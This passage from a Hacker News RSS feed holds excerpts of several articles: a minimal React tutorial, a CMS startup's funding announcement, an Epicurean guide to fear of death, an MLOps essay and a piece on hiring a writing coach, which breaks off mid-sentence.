<li>The <em>substitutions</em> <code>numberOfFruits</code> and <code>nameOfFruits</code> are dynamic (possibly different each time this particular function call is made)</li>
</ul>
<p>Substitutions are inserted “into” the template via the syntax <code>${···}</code>.</p>
<p>The <em>tag function</em> <code>html</code> supports React’s syntax for creating virtual DOM elements. It parses its input to produce its output.</p>
<h4 id="syntactic-layer-2%3A-jsx%2C-react%E2%80%99s-syntax-for-creating-virtual-dom-elements">Syntactic layer 2: JSX, React’s syntax for creating virtual DOM elements&nbsp;&nbsp;</h4>
<p><em>JSX</em> is a non-standard JavaScript language feature introduced by React. It lets us use HTML-ish expressions to create virtual DOM data. JSX must be compiled to standard JavaScript and is supported by several compilers – for example:</p>
<ul>
<li><a href="https://babeljs.io/">Babel</a>:
<ul>
<li>Input: modern and/or future JavaScript</li>
<li>Output: current or older JavaScript</li>
</ul>
</li>
<li><a href="https://www.typescriptlang.org/">TypeScript</a>:
<ul>
<li>Input: JavaScript plus static type information (roughly, a superset of JavaScript)</li>
<li>Output: current or older JavaScript</li>
</ul>
</li>
</ul>
<p>In this tutorial, we use a tagged template instead of JSX, which has the benefit that we can use plain JavaScript (no compilation is necessary). There are only minor differences between <code>html</code> syntax and JSX, which is why I’ll occasionally use the name JSX for the former.</p>
<p>There are two kinds of elements.</p>
<h5 id="react-components">React components&nbsp;&nbsp;</h5>
<p>First, the name of an element can be a function whose name starts with an uppercase letter:</p>
<pre><code>html<span>`&lt;<span>${UiComponent}</span> arg1="abc" arg2=<span>${<span>123</span>}</span> /&gt;`</span>
</code></pre>
<p>This expression is equivalent to:</p>
<pre><code>React.createElement(UiComponent, { <span>arg1</span>: <span>"abc"</span>, <span>arg2</span>: <span>123</span> })
</code></pre>
<p>In this case, <code>React.createElement()</code> makes the following function call:</p>
<pre><code>UiComponent({ <span>arg1</span>: <span>"abc"</span>, <span>arg2</span>: <span>123</span> })
</code></pre>
<h5 id="virtual-dom-elements">Virtual DOM elements&nbsp;&nbsp;</h5>
<p>Second, the name of an element can also be a string that starts with a lowercase letter:</p>
<pre><code>html<span>`&lt;div arg1="abc" arg2=<span>${<span>123</span>}</span> /&gt;`</span>
</code></pre>
<p>This expression is equivalent to:</p>
<pre><code>React.createElement(<span>"div"</span>, { <span>arg1</span>: <span>"abc"</span>, <span>arg2</span>: <span>123</span> })
</code></pre>
<p>In this case, <code>React.createElement()</code> directly creates virtual DOM data.</p>
<h4 id="jsx-in-action">JSX in action&nbsp;&nbsp;</h4>
<p>Let’s go back to the initial code:</p>
<pre><code>html<span>`&lt;<span>${CountingClicks}</span> rootModel=<span>${rootModel}</span> /&gt;`</span>
</code></pre>
<p>What is happening here?</p>
<p>We are invoking the component <code>CountingClicks</code> (a function) and pass it a single parameter, whose label is <code>rootModel</code>. This is what the root model looks like:</p>
<pre><code><span>const</span> rootModel = {
  <span>numberOfClicks</span>: <span>0</span>,
};
</code></pre>
<h3 id="the-component-countingclicks()">The component <code>CountingClicks()</code>&nbsp;&nbsp;</h3>
<p>The component is implemented as follows:</p>
<pre><code><span><span>function</span> <span>CountingClicks</span>(<span>{rootModel: initialRootModel}</span>) </span>{
  <span>const</span> [rootModel, setRootModel] = useState(initialRootModel); 
  <span>return</span> html<span>`
    &lt;div&gt;
      &lt;a href="" onClick=<span>${handleIncrement}</span>&gt;
        Number of clicks: <span>${rootModel.numberOfClicks}</span>&lt;/a&gt;
      &lt;p /&gt;
      &lt;button onClick=<span>${handleReset}</span>&gt;Reset&lt;/button&gt;
    &lt;/div&gt;
  `</span>;

  <span><span>function</span> <span>handleIncrement</span>(<span>event</span>) </span>{
    
  }
  <span><span>function</span> <span>handleReset</span>(<span>event</span>) </span>{
    
  }
}
</code></pre>
<p>The component returns a single virtual DOM element, a <code>&lt;div&gt;</code>. We use the <code>${···}</code> syntax to insert values into the returned data:</p>
<ul>
<li>The click event handler <code>handleIncrement</code></li>
<li>The number <code>rootModel.numberOfClicks</code></li>
<li>The click event handler <code>handleReset</code></li>
</ul>
<h4 id="handling-state-via-the-usestate-hook">Handling state via the <code>useState</code> hook&nbsp;&nbsp;</h4>
<p>The function call <code>useState()</code> in line A adds <em>reactivity</em> to our code:</p>
<ul>
<li><code>rootModel</code> is the current model data (the M in MVC).</li>
<li><code>initialRootModel</code> is the initial value of <code>rootModel</code>.</li>
<li><code>setRootModel</code> can be used to change <code>rootModel</code>. Whenever we do that, React automatically reruns the <code>CountingClicks</code> component so that the user interface always reflects what’s in the model.</li>
</ul>
<p>Never mind <em>how exactly</em> React does this! There is a ton of magic going on behind the scenes. Therefore, it is better to think of <code>useState()</code> as a language mechanism rather than as a function …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://2ality.com/2020/08/minimal-react.html">https://2ality.com/2020/08/minimal-react.html</a></em></p>]]>
            </description>
            <link>https://2ality.com/2020/08/minimal-react.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24276175</guid>
            <pubDate>Tue, 25 Aug 2020 21:12:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tipe raises $2.1M seed round to build a customizable CMS for developers]]>
            </title>
            <description>
<![CDATA[
Score 39 | Comments 41 (<a href="https://news.ycombinator.com/item?id=24275948">thread link</a>) | @tmvnty
<br/>
August 25, 2020 | https://tipe.io/blog/tipe-raises-seed | <a href="https://web.archive.org/web/*/https://tipe.io/blog/tipe-raises-seed">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Today we're excited to announce that tipe has raised $2.1m in seed funding led by CRV and joined by investors YC, M Ventures, and Precursor Ventures. This investment will help tipe deliver an excellent experience for developers and teams who need a better workflow for managing content. Since graduating from YC's Winter 18 batch, we've been building prototypes, talking with users, and learning from the community. We're finally ready to show everyone what we've learned.  </p><p>Teams are shifting away from legacy site builders to more sophisticated builds with frameworks like Next.js and Gatsby. Cloud computing, crawlers, and JavaScript have all approved and come together to enable this shift. Jamstack offers so many benefits for low effort but also introduces more decision making. Teams must now decide on a content workflow, and developers are on the hook to figure it out.</p><p>We want to make this decision easy for developers. </p><h2>Make it your own, together</h2><p>They always say, "...never build a CMS". We know every team has different needs and use cases when it comes to content workflows. Customization and extendability are at the core of tipe's design.  That's why tipe is open-source and has a simple plugin features that make it easy for you to create your own CMS.</p><p>We invest in the open-source community and all the efforts to create and maintain the fantastic projects leading the Jamstack wave. We encourage developers to use plugins and extensions for tipe created by the community. One of our goals is to make sure we're not another app devs have to maintain, so we'll be working with developers to make sure working with tipe stays lean and fast. </p><p>We can't do this alone, so today we're launching the <a href="https://join.slack.com/t/tipe-hq/shared_invite/zt-gfesfzxf-9KHj1Q3GPhUbUOa6PjNpTA">tipe community slack</a>ðŸŽ‰. You can interact with the tipe team more closely, see what the community is cooking up, or even get help for anything that comes up. </p><h2>Roadmap to the best experience</h2><p>Developer and user experience are our main focuses here at tipe. As we grow, we want to move towards a minimal and straightforward product to use but powerful when combined with plugins and extensions. To achieve this goal, we plan on maintaining transparency about the direction of tipe and what's coming next. We'll also be leaning on our users and the community to help us build something that they would love. </p><p>To start, we have support for Jamstack frameworks like Next.js and Gatsby, a CLI to get started without ever visiting our web app, and SDKs to query content. As the community grows and improves tooling, we'll support all that comes from it. Open-source is are core, well before tipe, and will remain that way as we grow. </p><h2>Perfect timing</h2><p>The web is transitioning into another era with all the moving pieces seeing significant enhancements. Now is the time to build a fast experience for your users. You can't do that if your team is slow, because of content changes or any reason.</p><p>We look forward to helping teams stay fast as they deliver amazing journeys for their users. Also, <a href="https://tipe.io/jobs">we're hiring</a>! If anything you read here resonates with you, we'd love to hear from you. </p></div></div></div>]]>
            </description>
            <link>https://tipe.io/blog/tipe-raises-seed</link>
            <guid isPermaLink="false">hacker-news-small-sites-24275948</guid>
            <pubDate>Tue, 25 Aug 2020 20:51:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to not fear your death: An Epicurean perspective]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24275882">thread link</a>) | @diodorus
<br/>
August 25, 2020 | https://psyche.co/guides/how-to-use-philosophy-to-overcome-the-fear-of-your-own-death | <a href="https://web.archive.org/web/*/https://psyche.co/guides/how-to-use-philosophy-to-overcome-the-fear-of-your-own-death">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><h2 data-guide-section-number="1"><span>Need to know</span></h2><div><p>Your demise is inevitable. I hope that doesnâ€™t come as too much of a shock. I agree that the brevity of human existence is bothersome. Thankfully, for most of us, this frightful fact usually hovers somewhere beyond the margins of our consciousness: weâ€™re â€˜awareâ€™ of our death without constantly fearing it.</p>
<p>Inevitably, though, there are moments when the reality of our eventual death strikes us in a new, chillier light. A close call demonstrates the tenuousness of life, or the death of a loved one reminds us that no one is exempt from humanityâ€™s ultimate destination. Even talking about death, as we are now, can be enough to bring on a ruminative contemplation of the end, and with it a shudder of fear about oneâ€™s own extinguishment.</p>
<p>In these moments, when your pending dissipation presents itself afresh, the fact of death is <em>experienced</em> in a new way. Rather than merely being â€˜knownâ€™ like one more quotidian statement about the world â€“ â€˜The sky is blue. I will dieâ€™ â€“ the sense of oneâ€™s ending is felt more deeply and more immediately. In these moods, the terror of death seeps into your awareness of yourself as a person; its awesome inevitability and finality makes you feel small and powerless. This is the fear of death at an existential level, brought on by the almost unthinkable notion that there is and only ever will be one of you â€“ and sooner or later it will flicker out of existence, leaving little more than memories in other soon-to-be-gone beings. The fear of death as Iâ€™m discussing it here is not about the practical worry of who will pay off your credit card debt after youâ€™re gone: itâ€™s about the unsettling fact that the person who earned that debt in the first place is but a fleeting speck of an event in the infinite history of the Universe.</p>
<p>The fear of death is also heightened by thinking about how harmful mortality is to us â€“ how there is no greater blow in life than for life to cease. As the philosopher Thomas Nagel observed, death is the great deprivation. There is always more life to be lived, and it is painful to have that taken away. The best way to get at this fear, perhaps, is to contemplate the almost unbearable thought of your future absence: one day, at family dinners, a place will no longer be set for you. The day after you die, the newspaper will still be published just as it was the day before. And the morning after your funeral, friends will make their morning coffee. You will be gone for good, though, and that certainly is a terrifying impediment.</p>
<p>So the fear of death is awful to behold â€“ and therefore, naturally, something to overcome. Indeed, the striving to overcome the fear of death, I would suggest, has stimulated a great deal of thinking over the course of humanityâ€™s time on Earth: one could go so far as to say that working out how to thwart, or perhaps accommodate, death sits at the root of a vast number of cultural achievements. The fear of finitude is a powerful propellant.</p>
<p>So how <em>can</em> the fear of death be overcome? One popular strategy is to plan for a sequel to life, which, itâ€™s usually expected, will take place in another, happier realm. Resurrection, whether as a human or otherwise, has won a great many adherents. And there have been several religions, as well as philosophers, that have promulgated a view of time as cyclical: weâ€™ve done this before, and weâ€™ll do this again. Death as a mere interlude.</p>
<p>These tactics and ideas have something to recommend them, certainly. But for now, letâ€™s set aside all possibility of life after death so that we are left with the often horrifying thought: you exist, but one day you wonâ€™t. Are there any good philosophical reasons not to fear that gulf â€“ between being and not-being? In this Guide, I will suggest several philosophically inspired reasons not to be fearful of your own death â€“ and so, in that sense, I hope that there is something helpful here to lighten the weight of the deeply unsettling existential state in which we are all lucky enough to find ourselves.</p></div></div></section><section><div><h2 data-guide-section-number="2"><span>What to do</span></h2><div><p>The life of the city-dwelling Ancient Greek philosopher Epicurus straddled the 3rd and 4th centuries BCE. His philosophy nowadays is popularly packaged as a kind of light hedonism: sensualist, joyful, a hint of luxury, a naughty second glass of wine. Though Epicurus himself was probably not quite the blinkered and unimaginative pleasure-seeker that these clichÃ©s suggest, they do give a flavour of his outlook.</p>
<p>For him, the purpose of human life is to achieve happiness. Epicurus construed this as an absence of pain rather than a positive programme of indulging oneself by, say, keeping up a rigorous schedule of orgies or downing flasks of opium on Tuesday mornings. He recognised that whatever temporary excitement such pursuits yield in the moment will probably be well counterbalanced by a severe price to pay later on. So instead, Epicurus recommended (somewhat disappointingly) that it is <em>moderation</em> that will lead to a release from pain and suffering, which in turn will bring a respectable measure of happiness and therefore a good life. Our limitations, our meagre certainties, are at the centre of Epicurusâ€™ system of thought, and it is in this context of mitigating pain and accruing a gentle happiness that he believed the fear of death needs to be understood. Epicurus and his followers held that the fear of death is harmful to the enjoyment of our lives, and so showing why this fear isnâ€™t well-founded contributes to the overall hedonic project of living well.</p>
<p>According to this tradition, the first thing to do to overcome the fear of death is to try to articulate to yourself what it would be like to <em>be</em> dead. Imagine <em>yourself</em>, but rather than alive â€“ dead. (Remember, weâ€™ve cast aside the afterlife.) As youâ€™ll swiftly appreciate, there is an intractable contradiction right at the centre of this first actionable item. You cannot imagine what it would be like to be dead, because death is an absence of existence. There is, literally, nothing to imagine â€“ because nothingness itself cannot be imagined. There is no perspective, no view from nothingness, nothing to which it can be approximated. So that is the first recommendation: realise that being dead isnâ€™t an experience. Death itself isnâ€™t really a <em>thing</em> at all. In Epicurusâ€™ words: â€˜Death is nothing to us.â€™</p>
<p>To drive the point home, letâ€™s turn to the Roman poet Lucretius. He was a saltier and more ironic Epicurean of a later generation, the 1st century BCE, whose unexampled poem <em>On the Nature of Things</em> fell afoul of early Christians because of its crypto-atheism. In the poem, Lucretius proposes an idea, later termed the â€˜Symmetry Argumentâ€™, that hints at the second thing you should do to overcome the fear of death: try to recall what it was like before you were born. Not how the world was, which is the task of historical imagination, but what it was like to <em>be</em> you â€“ before you were created. Youâ€™ll discover that prenatal existence isnâ€™t something that can be thought about, much less experienced. The symmetrical part of the argument, of course, is that you have the very same difficulty in imagining what it is like to be dead. Indeed, according to Lucretius, you-pre-existence is the same thing as death or post-existence: both involve the absence of you. No doubt you donâ€™t fear your prenatal existence and logically speaking, given their equivalence, it follows that you should fear death the exact same amount, as in not at all. (As the novelist Vladimir Nabokov put it in his memoirs: â€˜common sense tells us that our existence is but a brief crack of light between two eternities of darkness.â€™)</p>
<p>This brings us to the third thing to do to calm your existential angst: examine how much â€˜nothingâ€™ â€“ nonexistence â€“ can reasonably be feared. That is, are there any good reasons for your pending death to trigger the emotion of fear? It is reasonable to be fearful of things to the extent that those things can cause you harm. It was reasonable to be jittery about nukes during the Cold War era; it is reasonable to be scared that humanity is turning the globe into a sauna; and it is reasonable for your heart to launch as from a trebuchet into your throat when your partner says to you the words â€˜We need to talk.â€™ These are all identifiable threats that foretell awful experiences. None of them would help us in our Epicurean goal of being happy, and so are reasonably feared.</p>
<p>But death itself â€“ not the process of dying, which is something different â€“ doesnâ€™t seem to be the sort of thing that one can reasonably be fearful of because it isnâ€™t anything. Itâ€™s not uncomfortable or hurtful to <em>be</em> dead. Itâ€™s not as if youâ€™re being deprived of life or of more contented years because, again, you simply arenâ€™t <em>there</em> to be deprived in the first place. For you, there is nowhere to locate the harm of being dead since being dead isnâ€™t a state of being. Itâ€™s not something that strictly speaking happens to you and so it canâ€™t be harmful. (No one would say St Francis of Assisi is <em>more</em> dead than the punk rocker â€˜GGâ€™ Allin because St Francis died longer ago.) Death is the absence of an event; itâ€™s not a happening or a thing at all because there isnâ€™t such a thing as you any longer. Even something that you dreamed or imagined â€“ say, a stranger standing silently by your bed as you wake â€“ has a kind of existence necessary for it to be the reasonable object of a fear, even if it turns out to have been the shadow of a tree. Death itself doesnâ€™t have this quality. And Lucretius would add: it is just as unreasonable to fear nonexistence after life as it is to fear nonexistence before birth.</p>
<p>This is the heart of Epicurusâ€™ and Lucretiusâ€™ argument for why there is no good reason to fear death. Note that their argument doesnâ€™t speak to the fear that others will die, which is a perfectly reasonable anxiety and one that we should …</p></div></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://psyche.co/guides/how-to-use-philosophy-to-overcome-the-fear-of-your-own-death">https://psyche.co/guides/how-to-use-philosophy-to-overcome-the-fear-of-your-own-death</a></em></p>]]>
            </description>
            <link>https://psyche.co/guides/how-to-use-philosophy-to-overcome-the-fear-of-your-own-death</link>
            <guid isPermaLink="false">hacker-news-small-sites-24275882</guid>
            <pubDate>Tue, 25 Aug 2020 20:45:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[DevOps, DataOps, and MLOps: the three waves of operationalization]]>
            </title>
            <description>
<![CDATA[
Score 17 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24275856">thread link</a>) | @mvartak
<br/>
August 25, 2020 | https://blog.verta.ai/blog/the-third-wave-of-operationalization-is-here-mlops | <a href="https://web.archive.org/web/*/https://blog.verta.ai/blog/the-third-wave-of-operationalization-is-here-mlops">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>

<p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p>Using machine learning models in products is hard. Most companies fail at extracting value from them because they can't operationalize models properly.</p>
<!--more-->
<p>We have gotten good at creating models and iterating on them, but <a href="https://venturebeat.com/2019/07/19/why-do-87-of-data-science-projects-never-make-it-into-production/"><span>most companies still don't use them well</span></a>. A model with acceptable performance that you can use is better than a great model that you can't. Then why are companies having so many issues leveraging them?</p>
<p>In this blog post, we show that some challenges are analogous to those before DevOps. We’ll also show that others introduce a new level in the development and operation process that requires a new stack.</p>
<p>The lessons here come from building ML products and platforms at companies like Twitter, NVIDIA, Cloudera, Google, and others. These companies have invested heavily in building their in-house ML platforms or external products for a variety of scenarios.</p>

<h2><span>Moving development closer to operations</span></h2>
<p>Two decades ago, software development was painful. Developers and operators were silos, and making any changes was an adventure. DevOps helped us fix that with a simple shift in mindset: developers should own their software end-to-end, and operators should support them. Operators could focus on building robust IT infrastructure instead of handling each application individually. Meanwhile, developers could speed their development practices by using the tools as their product demanded. This change was the first wave of operationalization, and it changed how we do software.</p>
<p><img src="https://lh5.googleusercontent.com/AzBl9kIU1PCLQLTZQ91tKPpn7bAmjghns_vNHPdloZ-V3XytDuyTemoZn96xA_QEgwuxrVG5vxqSBFixSx2hEtOhiawWdwQ_Ix7TYS_sQ1A5pxbrFhGtT4cWw7rewEymlJqtQ1ya" width="453" height="283"></p>
<p><span>Around the same time, data started to become more relevant via analytics. The goal was to understand the data companies had available. Seeing the success of DevOps, analytics professionals partnered with their operators to create DataOps. In this case, analysts could focus on their business use case while operators made their use reliable.</span></p>
<p><span>Today, machine learning faces a similar challenge. The goal of ML is to help products make decisions on the spot. For example, which messages to show from a search query. These applications focus on actively improving the business instead of just providing insights. However, these more complex applications also have requirements we had never seen, and the operations world is just starting to adjust.</span></p>
<p><span>We now face a similar challenge for model developers that we have encountered before in software development:</span></p>
<ul>
<li><span>Data scientists don't own their work end-to-end. Instead, they send their models to a software developer and data engineer to build the machinery on a case by case basis.</span></li>
<li><span>Data scientists are frequently blocked, waiting for other developers to help them.</span></li>
<li><span>Data scientists are blind to the processes required to satisfy operations until it's too late. In which case, the work is dropped or re-done.</span></li>
</ul>
<h2><span>Why MLOps is so hard</span></h2>
<p><span>Using ML models in products is a quantum leap in their value, and every such significant change comes with paradigm shifts. Not only MLOps is hard on itself, but most companies are not prepared to practice it today if done naively. The challenges of adopting MLOps boils down to:</span></p>
<ul>
<li><span>You have to support multiple pre-existing tools in two isolated ecosystems;</span></li>
<li><span>Models have more dimensions in their requirements, and operate on a broader range of each trade-off;</span></li>
<li><span>You need to provide a self-service ecosystem for data scientists that currently don't have the operations skills that developers do;</span></li>
<li><span>Companies' processes on using ML must start where they're at today and adapt as their use advances;</span></li>
<li><span>ML adds an entirely new layer to the operations stack.</span></li>
</ul>

<h4><span>MLOps challenge 1: pre-existing ecosystems</span></h4>
<p>Software development and model development have pretty mature ecosystems today, with constant and fast improvements. However, these ecosystems are mostly isolated. Consider a core piece of infrastructure: the workflow system. Software engineers will most likely use Jenkins, GitLab, CircleCI, or any similar tools. However, data scientists use Airflow, Kubeflow, and other ML-targeted workflow systems. These two ecosystems might eventually combine, but this can take years and a lot of effort. Instead, we need to meet them where they are today.</p>

<p><img src="https://lh4.googleusercontent.com/GV0KR8tRUGnuk80NmXXCdUuZPwkoupXwKLisbeq2e8-wpmyqjKY0CMMmx6QwafOC61QboUsIC58ZegUYS4hSrfM8VO1Gbv7fgULTyuFPcH14hM_uQGgp1kFchIqQFEfJsAapbInQ" width="277" height="305"></p>
<p>From the data scientist's perspective, they need the infrastructure to be reliable. It should work in the way that they want almost always and provide all the functionality they want to use but not develop. The researcher isn't concerned with which tools achieve this goal, as long as it works with their current solutions.</p>
<p>On the other hand, IT provides a vibrant ecosystem of productivity tools, but they require applications to behave in a particular way. The challenge operators face with data science today is that adapting all those practices to the ML ecosystem is difficult and time-consuming. So they need the ML applications to look like applications they already support.</p>
<p>This golden standard is hard to achieve. Therefore most companies end up with multi-year migration projects that change how everyone does their job simultaneously. As you can imagine, these projects fail most of the time. Instead, we need to figure out how to get these two personas to collaborate first and get value from each other.</p>

<h4><span>MLOps challenge 2: dimensions of model requirements</span></h4>
<p>In modern software development, the system's requirements are usually pretty narrow, so tools can be more focused. Models not only have more dimensions, but the placement of a solution is also fuzzier.</p>
<p><img src="https://lh6.googleusercontent.com/6emah1WRzYxr97IHXpSJzKyeweuXtc3weSwUWtwBrXYJpVhg3keKrtaH_OszAh_Y6UYcaTXYX_OuqPw8DpncM_VmISOvpy58jzleK1VWUoMWV0nezh2doT64UeF0B-gvBwS_UhWX" width="487" height="426"></p>
<p>These are just a few examples of standard dimensions considered and it’s by no means an exhaustive list. Note how software usually lies on clear points in the spectrum. For instance, you know if the application provides an HTTP endpoint or runs in the user's device. Unsurprisingly, that is generally not the case for models. During the lifecycle of the model, from conception to use in a product, the same model might be at different places in the requirements balance. Using the same example, we might not use the end device for computing our test metrics due to speed concerns, but use the model as a library instead.</p>
<p>Most companies start to deploy models by building a solution for a particular case and ignoring others. Then they patch it a little bit to adapt to another model or another use case of the same model. And again, until they end up with a system that is hard to use, change, and maintain.</p>
<p>In which case, new users might consider it's easier to build their own from scratch for their use case. That's how many companies, including big tech ones, end up with multiple internal ML platforms if they're not careful. Keeping in mind the diversity of requirements, even within a single project, is an essential but challenging effort.</p>

<h4><span>MLOps challenge 3: self-service operations for data scientists</span></h4>
<p>One of the core tenets of DevOps is that developers should own their applications end-to-end. To do this properly, operators needed to provide mechanisms for their users to self-service. It allows IT to scale to multiple customers and removes delays waiting on someone else to provide some tooling.</p>

<p><img src="https://lh6.googleusercontent.com/hcT3ffqnaPw9OltYcczXKEgqjt2IHm1xB0O6vuPt2THWRmkHK62dKJ3dwdlm2UajB3mdtN4RskM3CbCJ_L9nh0cU-1pA56x9PtBziPQitU28STuw5NQMpJXaBXOxZFlQmfHLEr1i" width="499" height="326"></p>
<p>The image above covers a few of the functionalities most companies will have in their self-service platform. IT provides tools and processes for core functionalities, focusing on providing a solid foundation. Meanwhile, developers define customizations on top of the platform or perform integration for their particular application. Companies have been reducing the distance between developers and operators for many years now, which allowed lower-level constructs to be used. However, that is not enough for researchers.</p>
<p><img src="https://lh6.googleusercontent.com/4zjcm39V61mB1y4PWkJvzrrkHAVzBG6R9KKwChTHJUe81tr87ppMc2aq1DrppBgbnUXdkbJWVQUvQP0PdMlk5xpMZommxEkhKsSxmWoaZLoQ_lrv4yE2a3dFGnv79oguFTUL4yqD" width="499" height="326"></p>

<p>As we have argued before, data scientists' current skill set is very distinct from bringing up and operating one of their models in production. Hence the platform provided for researchers needs to be at a higher level than for software developers. For example, developers know how to define their systems' behavior to ensure it meets a particular SLA. But data scientists want to specify what those SLAs are and rely on a platform to handle the complexities to achieve that.</p>
<p>Thankfully the industry started to make higher-level constructs available for software engineers too. As anybody would suspect, operating low-level definitions is a considerable overhead. However, the further away you get from the specifics, the more domain knowledge you need to embed in the platform. Unfortunately, not every operations team has this knowledge at hand to support ML applications.</p>

<h4><span>MLOps challenge 4: adapt to existing processes and grow with the company</span></h4>
<p>Every big software company has a set of processes in place for software development. These processes took years and many iterations to develop correctly, potentially including expensive mistakes. When thinking about using models in production, teams frequently face the challenge of building these processes from scratch.</p>

<p><img src="https://lh5.googleusercontent.com/755p1w0mxyZwNwQFrwm_C2OLPIfMS-OAoOrRN5DjfAx2Z_70kHhNRvDRQk4L-Ygu3bnZRBkweEyRrtr8AlGKKQVQFFES7-yXnceVLGkI8VkBLNVh5yhrn5eyNDjmNTcrUvw_Yky9" width="452" height="285"></p>

<p>However, at the start of the ML journey, most operations constraints will look similar to doing software engineering. Operationalizing ML has higher success at places that first adapt their current processes the best they can. Once they have that initial version, the team iterates on the process as they identify improvements related to the new application domain or new product requirements.</p>
<p>This evolution of processes means that platforms and infrastructure must be able to adapt along with their teams. As new regulations and customer requests evolve, so will the requirements and limitations on model development and execution. Switching to a new system every time that happens is expensive. But relying on external enforcement is prone to misalignment failures. Hence production ML needs to meet users where they are today to bring immediate value while supporting the evolution of their ML methodologies.</p>

<h4><span>MLOps challenge 5: new layer at the operations stack</span></h4>
<p>This challenge is potentially the most undervalued one for MLOps: adding models creates an entirely new layer to the operations stack. In a simplified way, each level of the operation stack covers the unit of computation, how …</p></span></p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.verta.ai/blog/the-third-wave-of-operationalization-is-here-mlops">https://blog.verta.ai/blog/the-third-wave-of-operationalization-is-here-mlops</a></em></p>]]>
            </description>
            <link>https://blog.verta.ai/blog/the-third-wave-of-operationalization-is-here-mlops</link>
            <guid isPermaLink="false">hacker-news-small-sites-24275856</guid>
            <pubDate>Tue, 25 Aug 2020 20:43:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Eight Lessons I Learned from Hiring a Writing Coach]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24275828">thread link</a>) | @aml183
<br/>
August 25, 2020 | https://www.arilewis.com/aris-posts/nb79cps2558ad5k88qusj2g761nph0 | <a href="https://web.archive.org/web/*/https://www.arilewis.com/aris-posts/nb79cps2558ad5k88qusj2g761nph0">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-ff90fafa3d7cc2ce1565"><div><p>The best athletes in the world have personal trainers: LeBron James, Serena Williams, Megan Rapinoe. I knew that to be the best, I needed to hire a writing coach to take me to the next level.</p><p>As a species, we have a monopoly on collective knowledge. So engaging with a mentor or a coach is one of the best ways to become smarter. A good friend referred me to his writing coach, who lives outside the Cleveland region. Now I value a good referral, but I also value relationships — and we've got plenty of expertise in this region. In Cleveland, relationships remain key — over the course of the pandemic, and long after.</p><p>I wanted to become an even better writer simply to see where it would take me. I enlisted the help of Randal Doane at&nbsp;<a href="https://cadence-editorial-neo.com/about/" target="_blank">Cadence Editorial Services</a>. (He works with clients in medtech and biotech, and he has a side hustle contributing to&nbsp;<a href="https://harpers.org/author/randaldoane/" target="_blank">Harper's</a>.) Randal's based on the west side, and his knowledge of the region and some of its key players allowed us to talk at a high level about things well beyond split infinitives and paragraph breaks. He is also knowledgeable about a range of topics, which is apparently what happens when you have a Ph.D.</p><p><strong>How did it work?</strong></p><p>To begin, our process entailed:</p><ul data-rte-list="default"><li><p>my delivery via Google Docs of essays to Randal on Monday and Wednesday by 11 a.m.</p></li><li><p>a Zoom chat at 3 p.m. those days, which included line-by-line discussions of my draft, with a focus on pop, voice and formatting</p></li><li><p>work on my social media voice, and in particular Twitter</p></li></ul><p>Before connecting with Randal, I published nine essays a month: eight for my newsletter and one for Crain's Cleveland Business. In that period, I learned quickly that quantity doesn't equal quality.</p><p><strong>Key tips</strong></p><p>We covered, of course, the obvious things. Make verbs active. Use the historical present. Put subheads to work, because some readers will simply scan your article. "Be honest about your own attention limits," Randal also advised. "If it takes you 20 minutes to get into a writing head space, don't schedule a 30 minute writing session. You're just building frustration into your process." Randal also taught me how to split quotes and put the speaker's name in the middle.</p><p>I'd be lying if I told you I'm on a schedule, but it's definitely getting better. Typically, I'd write from 10 p.m. to 1 a.m. (Yes, I'm a night owl. It works for me. Per Randal's suggestion, I wrote this essay on a Monday morning. A huge accomplishment for me!)</p><p>Next, on Randal's recommendation, I downloaded&nbsp;<a href="http://www.hemingwayapp.com/" target="_blank">the Hemingway app</a>. This app helps you make your writing more succinct. If you want to be a better writer, download it.</p><p>Writing isn't only about words. It's about appearance, too. So what's the best way to engage readers in the attention economy? I started crafting multiple headlines and subheads and using bold words strategically. I also aim to ensure that every sentence delivers value. With my essays on branding and digital platforms, I aim to deliver reader-friendly, thought-provoking content every time.</p><p>Once I finished my first draft, I'd read it aloud. What a difference that makes. "Your ear will pick up things your eye scans past," Randal noted. Awkward phrasing, subject-verb disagreement, and run-on sentences: You name it, I wrote it, and now my ear knows better. In my defense: My mom served as my proofreader for ages, so I was pretty lazy about proofreading.</p><p>Finally, I'd send it to Randal. His edit focused on the Cs of writing: clarity, concision and cadence. We'd connect by phone and Google Docs and, on an unmarked copy of the essay, he would introduce his suggestions one by one. Every time Randal dropped a knowledge bomb, I scooped it up, defused it, and either applied it right then or filed it away for future engagement.</p><p>So what did the finished product look like?</p><p><strong>The results</strong></p><p>Right away, I saw how my writing improved, and my readers took notice, too. "These pieces are getting better and better," one reader wrote. "I find myself wanting more though. Ever thought about bringing them up to 750-1000 words instead of what seems like 450-650?" I think a big part of it was sentence length. With Randal's help, I trimmed median sentence length by 27% and still increased the variety of sentence lengths by 12%.</p><p>Wow! Not only was I enjoying the writing more, my readers wanted me to write longer pieces. My list of subscribers kept growing, too. In the month and a half I worked with Randal, my newsletter list increased by 49%. My open rate is solid, too, and 170 new people signed up to read my writing twice a week.</p><p>But the biggest accomplishment was from my mom. The self-described "perfectionist" was always supportive of my work, but definitely critical. As a proofreader in her past life, she was obsessed with finding the mistakes. By the end of my coaching boot camp with Randal, she complimented me on how much my writing had improved.</p><p><strong>More than just words on the page</strong></p><p>Our work entailed more than writing. It included work on my personal brand. Randal kept asking: Who is Ari Lewis? Why does 